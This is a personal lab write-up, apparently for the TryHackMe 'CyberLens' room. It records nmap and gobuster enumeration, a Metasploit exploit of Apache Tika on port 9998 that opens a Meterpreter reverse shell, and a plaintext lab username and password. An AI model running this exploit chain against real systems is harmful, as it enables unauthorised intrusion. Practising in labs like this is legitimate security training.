---
creation date: June 4th 2023
last modified date: June 4th 2023
aliases: []
tags: #🧩
---

# [[THM - CyberLens]]  

```shell
export IP=10.10.228.119
```

## Initial Nmap

```shell
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.4.57 ((Win64))
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.57 (Win64)
|_http-title: CyberLens: Unveiling the Hidden Matrix
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 6.3.9600
|_  System_Time: 2023-06-05T00:11:16+00:00
|_ssl-date: 2023-06-05T00:11:21+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=CyberLens
| Issuer: commonName=CyberLens
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-06-02T16:10:56
| Not valid after:  2023-12-02T16:10:56
| MD5:   e26705cd00acec15606413f7b19bfd42
|_SHA-1: 176272c21b4be820a241ba3af18f8d86d1c8a9c9
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9998/tcp  open  http               Jetty 8.y.z-SNAPSHOT
|_http-cors: HEAD GET
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
| http-methods: 
|   Supported Methods: POST GET PUT OPTIONS HEAD
|_  Potentially risky methods: PUT
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Connection: close\x0D
| Server: Jetty(8.y.z-SNAPSHOT)\x0D
| \x0D
|_Error: 400
|_http-title: Site doesn't have a title (text/plain).
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49167/tcp open  msrpc              Microsoft Windows RPC
49168/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-06-05T00:11:15
|_  start_date: 2023-06-05T00:04:40
| nbstat: NetBIOS name: CYBERLENS, NetBIOS user: <unknown>, NetBIOS MAC: 0219cd2e64e3 (unknown)
| Names:
|   CYBERLENS<00>        Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  CYBERLENS<20>        Flags: <unique><active>
| smb2-security-mode: 
|   302: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
Initiating NSE at 20:11
Completed NSE at 20:11, 0.00s elapsed
Initiating NSE at 20:11
Completed NSE at 20:11, 0.00s elapsed
Initiating NSE at 20:11
Completed NSE at 20:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 255.47 seconds
           Raw packets sent: 67091 (2.952MB) | Rcvd: 68788 (3.154MB)
```

Decided to try and checkout the SMB with `smbclient` but didn't have any luck there. Website does look good though...



## Gobuster output

```shell
gobuster dir --url http://$IP --wordlist $DIRLARGE
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.228.119
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/SecLists-master/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/04 20:20:15 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://10.10.228.119/images/]
/js                   (Status: 301) [Size: 232] [--> http://10.10.228.119/js/]
/css                  (Status: 301) [Size: 233] [--> http://10.10.228.119/css/]
/Images               (Status: 301) [Size: 236] [--> http://10.10.228.119/Images/]
/CSS                  (Status: 301) [Size: 233] [--> http://10.10.228.119/CSS/]
/JS                   (Status: 301) [Size: 232] [--> http://10.10.228.119/JS/]
/Js                   (Status: 301) [Size: 232] [--> http://10.10.228.119/Js/]
/Css                  (Status: 301) [Size: 233] [--> http://10.10.228.119/Css/]
/IMAGES               (Status: 301) [Size: 236] [--> http://10.10.228.119/IMAGES/]
/con                  (Status: 403) [Size: 199]
/aux                  (Status: 403) [Size: 199]
Progress: 23996 / 62285 (38.53%)[ERROR] 2023/06/04 20:23:51 [!] parse "http://10.10.228.119/error\x1f_log": net/url: invalid control character in URL
/prn                  (Status: 403) [Size: 199]
/Con                  (Status: 403) [Size: 199]
/jS                   (Status: 301) [Size: 232] [--> http://10.10.228.119/jS/]
Progress: 62284 / 62285 (100.00%)
===============================================================
2023/06/04 20:29:35 Finished
===============================================================
```

## While Gobuster was running, decided to visit the HTTP on port 9998

![[Pasted image 20230604202811.png]]

## Taking this new info over to the terminal and running a simple searchsploit returned;

![[Pasted image 20230604203432.png]]

## Since Metasploit is an option, we will take that route.

```shell
sf6 exploit(windows/http/apache_tika_jp2_jscript) > show options

Module options (exploit/windows/http/apache_tika_jp2_jscript):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.228.119    yes       The target host(s), see https://docs.metasploit.com/docs/usi
                                         ng-metasploit/basics/using-metasploit.html
   RPORT      9998             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly genera
                                         ted)
   TARGETURI  /                yes       The base path to the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be
                                        an address on the local machine or 0.0.0.0 to listen on all a
                                       ddresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.186    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows

```

## Using my favorite word `exploit`

```shell
msf6 exploit(windows/http/apache_tika_jp2_jscript) > exploit

[*] Started reverse TCP handler on 10.6.9.20:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending PUT request to 10.10.228.119:9998/meta
[*] Command Stager progress -   8.10% done (7999/98798 bytes)
[*] Sending PUT request to 10.10.228.119:9998/meta
[*] Command Stager progress -  16.19% done (15998/98798 bytes)
[*] Sending PUT request to 10.10.228.119:9998/meta
[*] Command Stager progress -  24.29% done (23997/98798 bytes)
[*] Sending PUT request to 10.10.228.119:9998/meta
[*] Command Stager progress -  32.39% done (31996/98798 bytes)
[*] Sending PUT request to 10.10.228.119:9998/meta
[*] Command Stager progress -  40.48% done (39995/98798 bytes)
[*] Sending PUT request to 10.10.228.119:9998/meta
[*] Command Stager progress -  48.58% done (47994/98798 bytes)
[*] Sending PUT request to 10.10.228.119:9998/meta
[*] Command Stager progress -  56.67% done (55993/98798 bytes)
[*] Sending PUT request to 10.10.228.119:9998/meta
[*] Command Stager progress -  64.77% done (63992/98798 bytes)
[*] Sending PUT request to 10.10.228.119:9998/meta
[*] Command Stager progress -  72.87% done (71991/98798 bytes)
[*] Sending PUT request to 10.10.228.119:9998/meta
[*] Command Stager progress -  80.96% done (79990/98798 bytes)
[*] Sending PUT request to 10.10.228.119:9998/meta
[*] Command Stager progress -  89.06% done (87989/98798 bytes)
[*] Sending PUT request to 10.10.228.119:9998/meta
[*] Command Stager progress -  97.16% done (95988/98798 bytes)
[*] Sending PUT request to 10.10.228.119:9998/meta
[*] Sending stage (175686 bytes) to 10.10.228.119
[*] Command Stager progress - 100.00% done (98798/98798 bytes)
[*] Meterpreter session 1 opened (10.6.9.20:4444 -> 10.10.228.119:58104) at 2023-06-04 20:44:00 -0400

meterpreter > 
```

## We have established connection we can start to fumble around.

![[Pasted image 20230604210335.png]]

## Now lets get that first flag for the user!

We find it in the `CyberLens\\Desktop\\user.txt` and while looking around we find the password for this user in `CyberLens\\Documents\\CyberLens-Managment\\Managment-Access.txt` while we are further enumerating the users folders.

![[Pasted image 20230604210515.png]]
![[Pasted image 20230605113837.png]]

And now we have login credentials
`CyberLens`
`HackSmarter123`















___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: June 4th 2023 (08:55 pm) 
Last Modified Date: June 4th 2023 (08:55 pm)
